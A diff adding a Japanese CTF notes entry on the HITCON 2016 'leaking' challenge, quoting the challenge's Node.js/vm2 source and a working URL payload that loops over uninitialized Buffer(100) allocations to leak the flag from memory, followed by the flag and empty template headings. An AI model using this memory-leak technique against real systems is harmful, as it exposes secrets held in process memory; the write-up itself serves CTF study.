@@ -258,6 +258,56 @@ print 'ok'
 r = requests.post('http://13.113.21.59:31337/reg', data=data);
 print r.content
 ```
+## Buffer(100) / vm.run() (hitcon2016 leakage)
+https://lorexxar.cn/2016/10/10/hitcon2016/  
+https://github.com/orangetw/My-CTF-Web-Challenges#leaking  
+以下のソースがある。  
+` eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")`でFlagを定義してるけど変数名がランダムになっていてわからん。  
+`res.send("eval ->" + vm.run(req.query.data));`でユーザーからのコードを実行できる。  
+```js
+"use strict";
+
+var randomstring = require("randomstring");
+var express = require("express");
+var {VM} = require("vm2");
+var fs = require("fs");
+
+var app = express();
+var flag = require("./config.js").flag
+
+app.get("/", function (req, res) {
+    res.header("Content-Type", "text/plain");
+
+    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
+    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
+    if (req.query.data && req.query.data.length <= 12) {
+        var vm = new VM({
+            timeout: 1000
+        });
+        console.log(req.query.data);
+        res.send("eval ->" + vm.run(req.query.data));
+    } else {
+        res.send(fs.readFileSync(__filename).toString());
+    }
+});
+
+app.listen(3000, function () {
+    console.log("listening on port 3000!");
+```
+https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md  
+`Buffer(100)`でメモリの中身をリークすればよい。  
+- **payload**  
+```txt
+http://52.198.115.130:3000/?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(100)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
+flag: hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}
+```
+## 
+- **payload**  
+## 
+- **payload**  
+## 
+- **payload**  
+
 # サンプルアプリ
 ## progate
 プロゲートの無料のアプリ。
